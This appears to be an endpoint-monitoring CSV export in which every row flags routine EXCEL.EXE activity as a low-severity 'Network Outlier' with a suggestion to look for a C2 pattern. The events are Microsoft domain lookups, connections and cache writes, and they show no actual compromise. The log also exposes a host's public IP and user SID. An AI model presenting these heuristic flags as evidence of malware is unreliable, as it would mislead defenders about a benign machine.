"Jun 1, 2026 @ 14:24:04.648",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,pin1-collabhubrtc.officeapps.live.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D44149F9
"Jun 1, 2026 @ 14:24:04.628",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\usr\local\ssl\cert.pem,,open,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9FC742F6
"Jun 1, 2026 @ 14:24:13.059",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\OneDrive\Documents\Primus.xlsx,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-CF246EB3
"Jun 1, 2026 @ 14:24:13.061",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\OneDrive\Documents\Primus.xlsx,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-579A23F5
"Jun 1, 2026 @ 14:23:36.936",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Office\Recent\Primus.xlsx.LNK,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F3A27DC1
"Jun 1, 2026 @ 14:23:36.925",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Office\Recent\Primus.xlsx.LNK,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8781D4ED
"Jun 1, 2026 @ 14:23:36.603",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0A692075
"Jun 1, 2026 @ 14:23:36.600",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-92A4A688
"Jun 1, 2026 @ 14:23:36.588",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-826B6317
"Jun 1, 2026 @ 14:23:36.584",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BD8BDC61
"Jun 1, 2026 @ 14:23:36.553",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-97D363D1
"Jun 1, 2026 @ 14:23:36.548",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\AT\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B9106055
"Jun 1, 2026 @ 14:23:36.544",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BF1FAA29
"Jun 1, 2026 @ 14:23:36.532",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\Accounts\r_74DB6FURNR2TGPBK.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-894D4EA0
"Jun 1, 2026 @ 14:23:36.527",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\ID\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D8E42106
"Jun 1, 2026 @ 14:23:36.517",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\FontCache\4\CatalogCacheMetaData2.xml,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-AF975223
"Jun 1, 2026 @ 14:23:36.490",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\e2cdfdebdbf5934269ce32e8b243aa8a2d32689d.tbres,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1E6C3370
"Jun 1, 2026 @ 14:23:36.240",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.182,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C84E058A
"Jun 1, 2026 @ 14:23:36.179",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,roaming.svc.cloud.microsoft,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A54F18DE
"Jun 1, 2026 @ 14:23:36.117",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,roaming.svc.cloud.microsoft,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-06B108AA
"Jun 1, 2026 @ 14:23:38.477",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.182,,,,disconnect_received,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1A40DA0E
"Jun 1, 2026 @ 14:23:38.427",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKLM\SYSTEM\ControlSet001\Control\SystemInformation\SystemManufacturer,,,query,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6E591700
"Jun 1, 2026 @ 14:23:38.253",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\IE\QWJAK8GE\V1Profile[1].json,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5BF3B096
"Jun 1, 2026 @ 14:23:37.295",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,40.104.66.98,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6E19BD5A
"Jun 1, 2026 @ 14:23:37.291",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,40.104.66.98,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A0245C54
"Jun 1, 2026 @ 14:23:37.283",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,substrate.office.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5B6FA362
"Jun 1, 2026 @ 14:23:37.248",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,substrate.office.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-96380A9F
"Jun 1, 2026 @ 14:23:37.235",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\History\CachePrefix,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-DE5BDC46
"Jun 1, 2026 @ 14:23:37.232",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Cookies\CachePrefix,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D893A53D
"Jun 1, 2026 @ 14:23:37.229",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Content\CachePrefix,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-126AFC14
"Jun 1, 2026 @ 14:23:37.222",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\Accounts\r_74DB6FURNR2TGPBK.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-202DD697
"Jun 1, 2026 @ 14:23:37.216",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\ID\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B30B639D
"Jun 1, 2026 @ 14:23:37.213",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\AT\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-76ECC783
"Jun 1, 2026 @ 14:23:37.156",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\756ab64960fbdb06ecb6ad858dc26a8a9f301273.tbres,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-37783366
"Jun 1, 2026 @ 14:23:36.964",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Wef\CustomFunctions\v1.7\hostproperties.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B06E1AB8
"Jun 1, 2026 @ 14:23:36.941",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Office\Recent\Primus.xlsx.LNK,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1432A2B5
"Jun 1, 2026 @ 14:23:48.505",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,substrate.office.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-66A157ED
"Jun 1, 2026 @ 14:23:48.498",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,substrate.office.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-272C0BDA
"Jun 1, 2026 @ 14:23:42.603",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\Documents_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BA7C2D9C
"Jun 1, 2026 @ 14:23:42.488",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\Places_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BBD7C01E
"Jun 1, 2026 @ 14:23:41.917",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.133,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-598D6469
"Jun 1, 2026 @ 14:23:41.811",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\8b7c814a5f5cb393feb9a7c6651b9b3049d4b3cf.tbres,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-EA635B76
"Jun 1, 2026 @ 14:23:41.462",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\aggmru\b1c53643363b744d_LiveId\x-mru4-en-US-sr.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E02C2BE9
"Jun 1, 2026 @ 14:23:39.750",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.133,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A5B9BB65
"Jun 1, 2026 @ 14:23:39.674",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,recent.svc.cloud.microsoft,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E7D3F58D
"Jun 1, 2026 @ 14:23:39.623",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.134,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6E9F111E
"Jun 1, 2026 @ 14:23:39.592",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,odc.officeapps.live.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-218D9BE3
"Jun 1, 2026 @ 14:23:39.527",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,messaging.engagement.office.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-4ADFB6EF
"Jun 1, 2026 @ 14:23:39.519",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,recent.svc.cloud.microsoft,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6A09F033
"Jun 1, 2026 @ 14:23:39.514",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,messaging.engagement.office.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-92814DE8
"Jun 1, 2026 @ 14:23:39.499",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,odc.officeapps.live.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-49ACCE73
"Jun 1, 2026 @ 14:23:38.820",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\DisplayForm\UrlFriendlyPathMapping3.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-97E99471
"Jun 1, 2026 @ 14:23:51.265",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\Licenses\5\2166136261946330807030266655,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-FC135ACE
"Jun 1, 2026 @ 14:23:51.253",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\8598F88E.tmp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D5D87506
"Jun 1, 2026 @ 14:23:50.158",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,licensing.m365.svc.cloud.microsoft,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-86295928
"Jun 1, 2026 @ 14:23:50.130",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,licensing.m365.svc.cloud.microsoft,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-DB3DB75A
"Jun 1, 2026 @ 14:23:49.818",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bef01b.TMP,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-55CD4849
"Jun 1, 2026 @ 14:23:49.816",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-EA2DF7BC
"Jun 1, 2026 @ 14:23:49.815",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bef01b.TMP,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5545337C
"Jun 1, 2026 @ 14:23:49.811",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bef01b.TMP,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-87420F63
"Jun 1, 2026 @ 14:23:49.805",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\TJFH6PAOEYDS222AK1AU.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5CA1B46D
"Jun 1, 2026 @ 14:23:49.105",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C528327D
"Jun 1, 2026 @ 14:23:49.103",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15beed3d.TMP,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F4589DD1
"Jun 1, 2026 @ 14:23:49.099",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15beed3d.TMP,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BDFB7BBD
"Jun 1, 2026 @ 14:23:49.093",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\7NY8QIIA8BM2G21SOQVS.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-AE7D43DC
"Jun 1, 2026 @ 14:23:49.067",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,mobile.events.data.microsoft.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-01349BF5
"Jun 1, 2026 @ 14:23:49.058",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,mobile.events.data.microsoft.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-3FD9AEE5
"Jun 1, 2026 @ 14:23:48.511",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,40.104.66.242,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-53383284
"Jun 1, 2026 @ 14:23:58.173",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EOHMCMGQCXEWDEEZFOF2AVHCCTFJD5DQ.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-FB8C1402
"Jun 1, 2026 @ 14:23:58.167",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E4BMCUFFAVFYAKHJGBATEWCVEIDWAREW.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-AD0CD0DE
"Jun 1, 2026 @ 14:23:58.166",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E4BMCUFFAVFYAKHJGBATEWCVEIDWAREW.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C2C04165
"Jun 1, 2026 @ 14:23:58.123",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\PlaceRequests_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-DC0EA031
"Jun 1, 2026 @ 14:23:58.107",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\DocumentRequests_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-381D634E
"Jun 1, 2026 @ 14:23:58.067",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\4C7883CC.xlsx,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6919AE07
"Jun 1, 2026 @ 14:23:58.056",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\FF0FB510,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D826B8BC
"Jun 1, 2026 @ 14:23:57.978",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Office\Recent\Documents on d.docs.live.net.url,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8A2841F8
"Jun 1, 2026 @ 14:23:57.972",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\C58DF95D.xlsx,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D24861B7
"Jun 1, 2026 @ 14:23:57.965",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\C58DF95D.xlsx,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-22F68B5D
"Jun 1, 2026 @ 14:23:57.961",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Office\Recent\Primus.xlsx.url,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F94A537C
